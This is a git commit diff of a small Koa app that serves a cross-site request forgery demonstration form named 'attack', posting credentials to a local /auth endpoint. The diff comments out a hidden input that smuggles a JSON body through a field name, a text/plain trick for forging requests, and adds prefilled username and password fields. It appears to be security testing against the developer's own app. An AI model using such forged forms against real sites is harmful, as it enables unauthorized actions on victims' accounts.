8d1dcbc849fa5300808befa600a4732e0c9bc027
DJviolin <kerozin.joe@gmail.com>
2017-04-11 14:52:59 +0200

    automated deployment 2017. 04. 11. 14:52:59,70

--- src/app-csrf.js
+++ src/app-csrf.js
@@ -4,9 +4,19 @@ const app = new Koa();
 app.use((ctx) => {
   ctx.body = `
     <form name="attack" enctype="text/plain" action="http://127.0.0.1:3000/auth" method="POST">
-      <input type="hidden" name='{"from": "User2", "to": "password2"}'>
+      <!--<input type="hidden" name='{"from": "User2", "to": "password2"}'>-->
       <p>
-        <button type="submit">Log In</button>
+        <label>Username:
+          <input type="text" name="user[name]" placeholder="Username" value="User2" />
+        </label>
+      </p>
+      <p>
+        <label>Password:
+          <input type="password" name="user[pass]" placeholder="Password" value="password2" />
+        </label>
+      </p>
+      <p>
+        <button type="submit">Attack!</button>
       </p>
     </form>
     <!--<script>document.attack.submit();</script>-->
